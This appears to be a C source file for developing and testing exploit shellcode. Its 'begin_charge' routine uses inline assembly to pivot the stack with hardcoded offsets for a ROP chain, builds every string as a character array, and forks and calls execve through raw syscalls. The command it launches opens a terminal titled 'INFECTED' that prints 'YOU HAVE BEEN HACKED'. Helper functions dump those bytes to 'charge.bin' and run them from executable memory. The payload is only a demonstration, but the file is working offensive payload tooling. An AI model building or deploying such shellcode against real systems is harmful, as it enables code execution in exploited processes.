#include <stdio.h>
#include <stdlib.h>  // For system
#include <sys/mman.h> // mmap
#include <errno.h>
#include <string.h>
#include <unistd.h>  // execve

#include <sys/syscall.h>  // environ, __NR_write
#include <sys/types.h>

const char* s_file = "./charge.bin";
typedef void (*func_t)(void);


int begin_charge(){
  // Warning: Do not change the stack (The pivot is not crude: gcc is sub rsp, 138h when I p_rsp - 0xf8)
  // alacritty --title '!!!  INFECTED   !!!' -d 30 10 -o 'font.size=30'  -e env -i INPUTRC= bash --noprofile --norc -ic 'echo YOU HAVE BEEN HACKED; bash --norc --noprofile'
  // a=" --norc"; print("{'" + "','".join(a) + "', 0};")
  char* p_rbp = NULL;
  asm(
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    //"int $3;"
  );

  // Save old stack (magic, rop chin size)
  asm("movq 0x110(%%rsp), %0;" : "=r"(p_rbp));

  // Restore old stack
  asm("movq %0, %%rsp;"
      : /* no output */
      : "r"(p_rbp - 0xf8)
      );

  // Cmd
  char arg0[] = {'/','u','s','r','/','b','i','n','/','e','n','v', 0};

  // Args
  char arg1[] = {'f','a','k','e','_','n','a','m','e', 0};
  char arg2_0[] = {'a','l','a','c','r','i','t','t','y', 0};
  char arg2_1[] = {'-','-','t','i','t','l','e', 0};
  char arg2_2[] = {'!','!','!',' ',' ','I','N','F','E','C','T','E','D',' ',' ',' ','!','!','!', 0};
  char arg2_3[] = {'-','d', 0};
  char arg2_4[] = {'3','0', 0};
  char arg2_5[] = {'1','0', 0};
  char arg2_6[] = {'-','o', 0};
  char arg2_7[] = {'f','o','n','t','.','s','i','z','e','=','3','0', 0};

  char arg3_0[] = {'-','e', 0};
  char arg3_1[] = {'e','n','v', 0};
  char arg3_2[] = {'-','i', 0};
  char arg3_3[] = {'I','N','P','U','T','R','C','=', 0};

  char arg4[] = {'b','a','s','h', 0};
  char arg5[] = {'-','-','n','o','p','r','o','f','i','l','e', 0};
  char arg6[] = {'-','-','n','o','r','c', 0};
  char arg7[] = {'-','c', 0};
  char arg8[] = {' ','b','a','s','h',' ','-','-','r','c','f','i','l','e',' ','<','(','e','c','h','o',' ','e','c','h','o',' ','Y','O','U',' ','H','A','V','E',' ','B','E','E','N',' ','H','A','C','K','E','D',')',' ', 0};



  char *p_argv[] = {
    arg1,
    arg2_0, arg2_1, arg2_2,
    //arg2_3, arg2_4, arg2_5,
    arg2_6, arg2_7,
    arg3_0,
    //arg3_1, arg3_2, arg3_3,
    arg4, arg7,
    arg8,
    NULL};

  // Env
  char env1[] = {'P','A','T','H','=','/','b','i','n',':','/','u','s','r','/','b','i','n',':','/','h','o','m','e','/','t','o','u','r','n','e','b','o','e','u','f','/','.','c','a','r','g','o','/','b','i','n','/', 0};
  char env2[] = {'D','I','S','P','L','A','Y','=',':','1', 0};
  char* p_envs[] = { env1, env2, NULL };

  ssize_t ret;

  //// Fork
  asm volatile
  (
      "syscall"
      : "=a" (ret)
      //                 EDI              RSI     
      : "0"(__NR_fork)
  );
  if (0 == ret){
    return 0;
  }

  // Execv
  asm volatile
  (
      "syscall"
      : "=a" (ret)
      //                 EDI              RSI     
      : "0"(__NR_execve),"D"(arg0), "S"(p_argv), "d"(p_envs)
      : "rcx", "r11", "memory"
  );
  

  // Reg            Before             After
  // rax            0x0                0x1                
  // rbx            0x55555558a7c0     0x55555558a7c0     
  // rcx            0x0                0xffffffffffffffff 
  // rdx            0x0                0x2f6e69622f6f6772 
  // rsi            0x0                0x0                
  // rdi            0x7fffffffa780     0x55555558a290     
  // rbp            0x7fffffffae40     0x1                
  // rsp            0x7fffffffad50     0x7fffffffad50     
  // r8             0x0                0x0                
  // r9             0x0                0x55555558a6bc     
  // r10            0x7ffff7f4f040     0x7ffff7faf000     
  // r11            0x246              0x246              
  // r12            0x20               0x8                
  // r13            0x0                0x7ffff7fb55d4     
  // r14            0x55555558a7c0     0x18               
  // r15            0x7ffff7fc150d     0x20               
  // rip            0x7ffff7fb551c     0x7ffff7fb5526     

clean_exit:
  // Restore rbp
  //asm("int $3;");
  asm("movq %0, %%rbp;"
      : /* no output */
      : "r"(p_rbp)
      );
  

  asm("xor %r10, %r10;\n\t");
  asm("xor %r13, %r13;\n\t");
  asm("xor %r14, %r14;\n\t");
  asm("mov $1, %rax;\n\t"
      "ret;\n\t");

  return 0x42;
}

int end_charge(){
  return 0x42;
}


int dump(){
  size_t begin = (size_t) begin_charge;
  size_t end = (size_t) end_charge;

  // Open file out
  FILE* h_file = fopen(s_file,"wb");
  if (!h_file){
    printf("Something wrong Writing to file: %s", s_file);
    return 1;
  }

  // Dump
  fwrite((void*) begin, end-begin, 1, h_file);
  
  // Return
  fclose(h_file);
  return 0;
}


int execute(){
  char* buffer = NULL;

  // Open file out
  FILE* h_file = fopen(s_file,"rb");
  if (!h_file){
    printf("Something wrong Reading to file: %s", s_file);
    return 1;
  }

  // Get len
  fseek (h_file, 0, SEEK_END);
  long length = ftell(h_file);
  fseek (h_file, 0, SEEK_SET);

  // Allocate
  buffer = (char*) mmap(NULL, length,
      PROT_READ | PROT_WRITE | PROT_EXEC,
      MAP_PRIVATE | MAP_ANONYMOUS,
      0, 0);
  if (MAP_FAILED == buffer) {
    printf("Error allocating: size %ld, error: %s\n", length, strerror(errno));
    return 1;
  }

  // Protect
  printf("Protecting %p\n", buffer);
  if (-1 == mprotect(buffer, length,
        PROT_READ | PROT_WRITE | PROT_EXEC
        )){
     printf("Protect failed, error %s\n", strerror(errno));
     return 1;
  }
  
  // Read
  printf("Reading %s\n", s_file);
  size_t ret = fread(buffer, 1, length, h_file);
  if (ret != (size_t) length){
     printf("Read failed\n");
     return 1;
  }

  // Execute
  //void (*p)() = (void (*))buffer;
  printf("Executing jumping to %s\n", (char*) buffer);
  //asm("int $3");
  // 
  #pragma GCC diagnostic error "-Wpointer-arith"
  func_t p_func = (func_t) (buffer+4);
  p_func();
  //p();

  // End
  printf("End: Jump returned ! See me at return?\n");
  fclose(h_file);
  return 0;
}

int main(int argc, char **argv) {
  printf("Usage: charge (dump); charge 1 (execute); charge 1 1 (call)\n");
  if (argc > 2){
    printf("Calling\n");
    begin_charge();
    printf("<- End Call\n");
    return 0;
  }
  if (argc > 1){
    printf("Executing\n");
    execute();
    printf("<- End execute\n");
    return 0;
  }

  return dump();
}
